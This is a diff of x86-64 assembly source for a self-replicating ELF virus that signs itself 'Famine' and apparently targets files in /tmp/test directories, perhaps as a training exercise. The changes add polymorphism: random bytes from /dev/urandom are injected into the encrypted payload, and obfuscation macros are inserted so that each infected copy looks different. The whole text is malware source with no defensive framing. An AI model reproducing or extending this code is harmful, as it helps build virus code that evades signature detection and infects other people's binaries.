@@ -11,6 +11,8 @@ OBF_GENERIC
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
 
+OBF_POLY_1
+
 OBF_GENERIC
 .check_status:		;open the /proc/self/status
 OBF_GENERIC
@@ -40,6 +42,7 @@ mov qword[rdi], rsi
 sub rdi, 12
 
 OBF_GENERIC
+
 
 mov rsi, O_RDONLY
 mov rax, _open
@@ -233,6 +236,44 @@ xor r10, r10
 	cmp r13, r12
 	jl .read_file
 	ret
+
+
+.get_random:
+	push rdi
+	push rsi
+	push rax
+	push rdx
+
+	lea rdi, [rel random]
+	mov rsi, O_RDONLY
+	mov rax, _open
+	syscall					; OPEN /dev/urandom  EXIT if not work
+	cmp rax, 0
+	jl	.err_ex
+
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 4
+	lea rsi, STACK(famine.tmp_rand)
+	syscall				; READ 8 RANDOM BYTE<3
+	
+	mov rax, _close
+	syscall
+
+	pop rdx
+	pop rax
+	pop rsi
+	pop rdi
+	ret
+	.err_ex:
+	pop rdx
+	pop rax
+	pop rsi
+	pop rdi
+	pop rdi
+	pop rdi
+	jmp _exx_pop
+
 
 
 .OUI:
@@ -545,6 +586,12 @@ OBF_GENERIC1
 	mov STACK(famine.morph_sign_u), r11
 	mov STACK(famine.morph_sign_d), r12
 
+	call _start.get_random
+	lea r10,STACK(famine.tocypher)
+	add r10, POLY_OFFSET_1
+	mov r12, STACK(famine.tmp_rand)
+	mov dword[r10], r12d
+
 	CYPHER
 	pop r12
 
@@ -635,13 +682,14 @@ OBF_GENERIC1
 		pop r13
 		ret
 
+
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
-random			db			"/dev/urandom"
 enc_end:
 	db 0
 signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
 forbidden		db			"test.out", 0
 famine_entry	dq			_start
+random			db			"/dev/urandom",0,0
 
 _exx_pop:
 POP
